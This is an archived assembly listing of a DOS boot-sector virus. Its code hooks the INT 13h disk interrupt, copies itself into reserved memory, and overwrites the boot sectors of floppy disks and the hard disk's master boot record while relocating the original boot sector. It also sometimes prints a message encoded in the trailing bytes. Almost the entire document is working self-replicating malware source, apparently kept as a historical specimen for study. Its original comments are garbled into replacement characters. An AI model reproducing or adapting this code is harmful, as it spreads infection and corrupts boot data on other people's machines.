; ------------------------------------------------------------
; name      X
; type      asm
; cve       —
; year      unknown
; os        DOS
; authors   unknown
; source    krisyotam
; archived  krisyotam (2026)
; notes     —
; ------------------------------------------------------------
		jmp	far ptr loc_2		;*(07C0:0005)
		jmp	loc_8			; (00A1)
data_27 	db	0
data_28 	dd	0F000EC59h
data_29 	dd	9F8000E4h
data_30 	dd	07C00h

;-----------------------------------------------------------------------------
;		 ������ ����� �� INT 13h
;-----------------------------------------------------------------------------

		push	ds
		push	ax
		cmp	ah,2			; ��� ��������� � ��-����� ��
		jb	loc_3			; 2 ��� ��-������ ��� �����
		cmp	ah,4			; �� 4 ��������� �������� INT 13h
		jae	loc_3
		or	dl,dl			; ������������ � A ?
		jnz	loc_3
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	al,byte ptr ds:[43Fh]	; ��������� ���� ������ ��
		test	al,1			; A � �������
		jnz	loc_3			; Jump if not zero
		call	sub_1			; ���� �� ��������
loc_3:
		pop	ax
		pop	ds
		jmp	cs:data_28		; (6B8E:0009=0EC59h)

;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������

sub_1		proc	near
		push	bx
		push	cx
		push	dx			; ������� ����������
		push	es
		push	si
		push	di
		mov	si,4
loc_4:
		mov	ax,201h
		push	cs
		pop	es
		mov	bx,200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		inc	cx
		pushf
		call	cs:data_28		; ���� BOOT �������
		jnc	loc_5			; Jump if carry=0
		xor	ax,ax			; ��� ������ �����������
		pushf				; ������������
		call	cs:data_28		; (6B8E:0009=0EC59h)
		dec	si
		jnz	loc_4			; ����� 4 �����
		jmp	short loc_7		; �����
		nop
loc_5:
		xor	si,si			; Zero register
		mov	di,200h
		cld				; Clear direction
		push	cs
		pop	ds
		lodsw				; ��������� ���� � �������
		cmp	ax,[di] 		; ���������� ����
		jne	loc_6
		lodsw
		cmp	ax,[di+2]
		je	loc_7			; ��� � ������
loc_6:
		mov	ax,301h
		mov	bx,200h 		; ��������� BOOT
		mov	cl,3
		mov	dh,1
		pushf
		call	cs:data_28
		jc	loc_7			; Jump if carry Set
		mov	ax,301h
		xor	bx,bx			; ������� ������
		mov	cl,1
		xor	dx,dx
		pushf
		call	cs:data_28
loc_7:
		pop	di
		pop	si
		pop	es			; ������������ ����������
		pop	dx
		pop	cx
		pop	bx
		retn
sub_1		endp

loc_8:
		xor	ax,ax			; Zero register
		mov	ds,ax
		cli				; Disable interrupts
		mov	ss,ax
		mov	sp,7C00h
		sti				;
		mov	ax,word ptr ds:[4Ch]	; ������� � AX ������� �� INT 13H
		mov	word ptr ds:[7C09h],ax	; ������� �� �� ���������� 9h
		mov	ax,word ptr ds:[4Eh]	; ����� �������� �� INT 13H
		mov	word ptr ds:[7C0Bh],ax	; ������� �� �� ���������� Bh
		mov	ax,word ptr ds:[413h]	; �������� ��������� ����� � 1K
		dec	ax
		dec	ax
		mov	word ptr ds:[413h],ax
		mov	cl,6
		shl	ax,cl
		mov	es,ax			; ������� � ES ���-������� �����
		mov	word ptr ds:[7C0Fh],ax	; �� ����� �� ���������
		mov	ax,15h
		mov	word ptr ds:[4Ch],ax	; INT 13H ���� ���������� 15H ��
		mov	word ptr ds:[4Eh],es	; �������� ��
		mov	cx,1B8h
		push	cs			;CS = 7C0h = DS
		pop	ds
		xor	si,si
		mov	di,si
		cld
		rep	movsb			; ������� 1B8h �����
		jmp	cs:data_29		; ������ �� ���������� ����������
		mov	ax,0
		int	13h			; ����������� �����

		xor	ax,ax			; Zero register
		mov	es,ax			; ES = AX = 00h
		mov	ax,201h 		; ���������� ��������� ��
		mov	bx,7C00h		; ��������� �� BOOT
		cmp	cs:data_27,0		; ��������� ���� �� ����������
		je	loc_9			; ������ ��� Flopy disk
		mov	cx,7
		mov	dx,80h
		int	13h			; ������� BOOT

		jmp	short loc_12		; (014E)
		nop
loc_9:
		mov	cx,3
		mov	dx,100h
		int	13h			; ������� BOOT

		jc	loc_12			; Jump if carry Set
		test	byte ptr es:[46Ch],7	; ��������� ���� �� ����
		jnz	loc_11			; ���������
		mov	si,189h 		;
		push	cs
		pop	ds
loc_10:
		lodsb				; ����� ����� �� �������
		or	al,al
		jz	loc_11			; ��� �� � ���� ������� ������
		mov	ah,0Eh
		mov	bh,0
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_10		; (011D)
loc_11:
		push	cs
		pop	es
		mov	ax,201h 		; ������ �� �� ���� �� ����� ����
		mov	bx,200h 		; ���� �������� ����������� ��
		mov	cl,1			; ���������� 200h
		mov	dx,80h
		int	13h			; Disk	dl=drive #: ah=func a2h
						;  read sectors to memory es:bx
		jc	loc_12			; ��� ������ ? -> �����
		push	cs
		pop	ds
		mov	si,200h
		mov	di,0
		lodsw				; ��������� ���� ������� � ��������
		cmp	ax,[di] 		; �� ������
		jne	loc_13			; ��� �� ������ �� ����������
		lodsw
		cmp	ax,[di+2]
		jne	loc_13
loc_12:
		mov	cs:data_27,0		; (6B8E:0008=0)
		jmp	cs:data_30		; ��������� BOOT
loc_13:
		mov	cs:data_27,2		; ������� �������� ����� ����
		mov	ax,301h
		mov	bx,200h 		; ��������� BOOT � ������ 7
		mov	cx,7			; ������ 0
		mov	dx,80h
		int	13h

		jc	loc_12			; ��� ������ ��������� BOOT
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	si,3BEh 		 ; ����� partition table
		mov	di,1BEh
		mov	cx,242h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]

		mov	ax,301h
		xor	bx,bx			; ������� ������ �����
		inc	cl
		int	13h			; Disk	dl=drive #: ah=func a3h
						;  write sectors from mem es:bx
		jmp	short loc_12		; ����� �� ��������� BOOT

;------------------------------------------------------------------------------------------
;			�� ��� ������ �� ��������
;------------------------------------------------------------------------------------------

		pop	es
		pop	cx
		db	6Fh
		jnz	$+74h			; Jump if not zero
		and	[bx+si+43h],dl
		and	[bx+di+73h],ch
		and	[bp+6Fh],ch
		ja	$+22h			; Jump if above
		push	bx
		jz	$+71h			; Jump if zero
		db	6Eh
		db	65h
		db	64h
		and	[bx],ax
		or	ax,0A0Ah
		add	[si+45h],cl
		inc	di
		inc	cx
		dec	sp
		dec	cx
		push	bx
		inc	bp
		xor	al,[bx+di]
		add	al,32h			; '2'
		add	word ptr ds:[0B00h][bx+si],ax	; (6B7E:0B00=0)
		add	ax,132h
		db	72 dup (0)
